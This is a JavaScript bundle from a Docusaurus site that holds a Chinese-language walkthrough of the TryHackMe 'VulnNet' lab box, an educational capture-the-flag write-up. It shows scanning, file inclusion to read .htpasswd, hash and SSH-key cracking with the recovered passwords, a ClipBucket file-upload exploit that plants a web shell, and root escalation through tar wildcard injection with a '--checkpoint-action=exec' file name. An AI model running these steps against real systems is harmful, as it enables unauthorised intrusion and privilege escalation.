"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[521],{72657:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>i,contentTitle:()=>X,default:()=>d,frontMatter:()=>r,metadata:()=>o,toc:()=>l});var s=t(74848),a=t(28453);const r={sidebar_position:101,tags:["Easy","Linux","\u6587\u4ef6\u5305\u542b","\u5b9a\u65f6\u4efb\u52a1","\u901a\u914d\u7b26"],title:"VulnNet",description:"VulnNet",sidebar_label:"VulnNet",slug:"/tryhackme/101"},X="VulnNet",o={id:"box/TryHackMe/101",title:"VulnNet",description:"VulnNet",source:"@site/docs/box/TryHackMe/101.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/101",permalink:"/docs/tryhackme/101",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u6587\u4ef6\u5305\u542b",permalink:"/docs/tags/\u6587\u4ef6\u5305\u542b"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"},{label:"\u901a\u914d\u7b26",permalink:"/docs/tags/\u901a\u914d\u7b26"}],version:"current",sidebarPosition:101,frontMatter:{sidebar_position:101,tags:["Easy","Linux","\u6587\u4ef6\u5305\u542b","\u5b9a\u65f6\u4efb\u52a1","\u901a\u914d\u7b26"],title:"VulnNet",description:"VulnNet",sidebar_label:"VulnNet",slug:"/tryhackme/101"},sidebar:"boxSidebar",previous:{title:"Oh My WebServer",permalink:"/docs/tryhackme/100"},next:{title:"Mindgames",permalink:"/docs/tryhackme/102"}},i={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; server-management",id:"www-data--server-management",level:3},{value:"server-management \u2014&gt; root",id:"server-management--root",level:3}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"vulnnet",children:"VulnNet"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-234-23:~/vulnnet1# nmap -sTCV -p 22,80 --min-rate 1000 10.10.47.181\n\nStarting Nmap 7.60 ( <https://nmap.org> ) at 2023-09-19 01:56 BST\nNmap scan report for vulnnet.thm (10.10.47.181)\nHost is up (0.00026s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)\n|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)\n|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (EdDSA)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: VulnNet\nMAC Address: 02:C7:C9:2A:A6:ED (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at <https://nmap.org/submit/> .\nNmap done: 1 IP address (1 host up) scanned in 8.73 seconds\n"})}),"\n",(0,s.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,s.jsx)(n.p,{children:"\u56e0\u4e3a\u9898\u76ee\u4e2d\u7ed9\u51fa\u4e86\u6211\u4e00\u4e2a\u57df\u540d\u6240\u4ee5\u6211\u76f4\u63a5\u5c31\u8fdb\u884c\u4e86\u5b50\u57df\u7684\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-234-23:~/vulnnet1# gobuster vhost -u <http://vulnnet.thm/> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:          <http://vulnnet.thm/>\n[+] Threads:      10\n[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:   gobuster/3.0.1\n[+] Timeout:      10s\n===============================================================\n2023/09/19 01:58:30 Starting gobuster\n===============================================================\nFound: broadcast.vulnnet.thm (Status: 401) [Size: 468]\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u626b\u63cf\u5230\u4e86\u4e00\u4e2a\u5b50\u57df, \u5982\u679c\u662f\u6b63\u5e38\u6e17\u900f\u6211\u4eec\u5e94\u8be5\u662f\u4ece\u65c1\u7ad9\u4e0b\u624b, \u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u8fd8\u662f\u8981\u4ece\u4e3b\u7ad9\u4e0b\u624b (\u8bbf\u95ee\u6211\u4eec\u626b\u63cf\u7684\u5b50\u57df\u9700\u8981\u6211\u4eec\u63d0\u4f9b\u5bc6\u7801)"}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee\u4e3b\u7ad9\u8fd9\u91cc\u5e76\u6ca1\u6709\u7ed9\u51fa\u4ec0\u4e48\u5185\u5bb9, \u552f\u4e00\u53ef\u80fd\u6709\u7528\u8fd8\u662f JS \u5185\u5bb9, \u6240\u4ee5\u6211\u5ba1\u8ba1\u4e86\u524d\u7aef\u7684 JS \u4ee3\u7801, \u5728\u5176\u4e2d\u6536\u96c6\u5230:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"http://broadcast.vulnnet.thm/",children:"http://broadcast.vulnnet.thm/"}),"  \u4e00\u4e2a\u94fe\u63a5"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"http://vulnnet.thm/index.php?referer=",children:"http://vulnnet.thm/index.php?referer="}),"  \u4ece\u8fd9\u4e2a\u7ed3\u6784\u6765\u770b\u5e94\u8be5\u662f\u6587\u4ef6\u5305\u542b\u6ca1\u8dd1\u4e86\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u8981\u5229\u7528\u6587\u4ef6\u5305\u542b\u53bb\u8bfb\u53d6 .htpasswd \u6587\u4ef6"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u8be2\u95ee GPT \u5f97\u77e5 .htpasswd \u6587\u4ef6\u7684\u5b58\u50a8\u4f4d\u7f6e, \u76f4\u63a5\u4f7f\u7528\u6587\u4ef6\u5305\u542b\u8fdb\u884c\u8bfb\u53d6"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-124717.png",alt:"img"})}),"\n",(0,s.jsx)(n.p,{children:"\u8bfb\u53d6\u5230\u4e4b\u540e\u8fdb\u884c hash \u7834\u89e3"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-234-23:~/vulnnet1/_file-icons.png.extracted# john hash.txt --wordlis=`locate rockyou.txt`\nWarning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"\nUse the "--format=md5crypt-long" option to force loading these as that type instead\nWarning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"\nUse the "--format=md5crypt-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n9972761drmfsls   (developers)\n1g 0:00:00:47 DONE (2023-09-19 02:39) 0.02090g/s 45184p/s 45184c/s 45184C/s 9981987654..9968615\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed.\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5f53\u7834\u89e3\u5b8c\u6210\u540e\u6211\u81ea\u7136\u662f\u9700\u8981\u53bb\u8df3\u8f6c\u5230\u65b0\u7684\u5b50\u57df\u8fdb\u884c\u653b\u51fb, \u6211\u89c2\u5bdf\u8fd9\u4e2a\u7f51\u7ad9\u5b58\u5728\u6ce8\u518c\u672c\u6765\u60f3\u7684\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u5728\u4e0a\u4f20\u5176\u4ed6\u5185\u5bb9\u6765\u5b8c\u6210\u653b\u51fb, \u4f46\u662f\u6ca1\u6709\u529e\u6cd5\u6ce8\u518c, \u540c\u65f6\u7f51\u7ad9\u7684\u56fe\u6807\u6cc4\u9732\u4e86\u4ed6\u7684\u7248\u672c ClipBucket 4.0 \u7ecf\u8fc7\u641c\u7d22\u53d1\u73b0\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-234-23:~/vulnnet1/Exploit-ClipBucket-4-File-Upload# python3 exploit.py broadcast.vulnnet.thm developers 9972761drmfsls\n\n          ==/           i     i           \\\\==_\n        /XX/            |\\\\___/|            \\\\XX\n      /XXXX\\\\            |XXXXX|            /XXXX\n     |XXXXXX\\\\_         _XXXXXXX_         _/XXXXXX|\n    XXXXXXXXXXXxxxxxxxXXXXXXXXXXXxxxxxxxXXXXXXXXXXX\n   |XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|\n   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n   |XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX|\n    XXXXXX/^^^^"\\\\XXXXXXXXXXXXXXXXXXXXX/^^^^^\\\\XXXXXX\n     |XXX|       \\\\XXX/^^\\\\XXXXX/^^\\\\XXX/       |XXX|\n       \\\\XX\\\\       \\\\X/    \\\\XXX/    \\\\X/       /XX/\n          "\\\\       "      \\\\X/      "      /"\n                                     \n                                      Autor: AbelJM\n                              Web: abeljm.github.io\n\t\n[*] Good Job!!\n[*] Shell Uploaded!!\n\n[+] Path Shell: <http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1695088051ccd163.php>\n\n[+] Example Run Shell: <http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1695088051ccd163.php?cmd=whoami>\n'})}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(n.p,{children:"\u5229\u7528\u4e0a\u9762\u4e0a\u4f20\u7684 WebShell \u6765\u83b7\u53d6\u4e00\u4e2a\u53cd\u5411 Shell"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-124728.png",alt:"img"})}),"\n",(0,s.jsx)(n.h3,{id:"www-data--server-management",children:"www-data \u2014> server-management"}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u5728\u5b9a\u65f6\u4efb\u52a1\u4e2d\u53d1\u73b0 root \u7528\u6237\u4f1a\u5b9a\u65f6\u6267\u884c\u4e00\u4e2a\u811a\u672c, \u5e76\u4e14\u89c2\u5bdf\u8fd9\u4e2a\u811a\u672c\u53d1\u73b0\u5176\u5b58\u5728\u901a\u914d\u7b26\u5229\u7528, \u4f46\u662f\u5229\u7528\u7684\u524d\u63d0\u662f\u6211\u4eec\u83b7\u5f97 server-management \u7684\u4f1a\u8bdd, \u89c2\u5bdf\u811a\u672c\u6211\u53d1\u73b0\u5176\u5c06\u751f\u6210\u7684\u5907\u4efd\u6587\u4ef6\u5b58\u50a8\u5230 /var/backups \u4e2d, \u63a5\u7740\u6211\u5728\u5176\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a ssh-backup.tar.gz \u6240\u4ee5\u5c06\u5176\u4e0b\u8f7d\u5e76\u5728\u5176\u4e2d\u53d1\u73b0\u4e86\u7528\u6237 server-management \u7684 SSH \u79c1\u94a5"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-234-23:~/vulnnet1# john hash.txt --wordlist=`locate rockyou.txt`\nNote: This format may emit false positives, so it will keep trying even after finding a\npossible candidate.\nWarning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"\nUse the "--format=ssh-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\noneTWO3gOyac     (id_rsa)\n1g 0:00:00:23 DONE (2023-09-19 02:53) 0.04275g/s 613155p/s 613155c/s 613155C/s *7\xa1Vamos!\nSession completed.\n'})}),"\n",(0,s.jsx)(n.h3,{id:"server-management--root",children:"server-management \u2014> root"}),"\n",(0,s.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u53ea\u9700\u8981\u6309\u7167\u901a\u914d\u7b26\u5229\u7528\u7684\u59ff\u52bf\u8fdb\u884c\u653b\u51fb\u5c31\u53ef\u4ee5\u4e86"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'server-management@vulnnet:~/Documents$  echo \'chmod u+s /bin/bash\' > root.sh\nserver-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh root.sh"\nserver-management@vulnnet:~/Documents$ echo "" > --checkpoint=1\nserver-management@vulnnet:~/Documents$ ls -al /bin/bash\n-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash\nserver-management@vulnnet:~/Documents$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash\nserver-management@vulnnet:~/Documents$\n'})})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(c,{...e})}):c(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>X,x:()=>o});var s=t(96540);const a={},r=s.createContext(a);function X(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:X(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);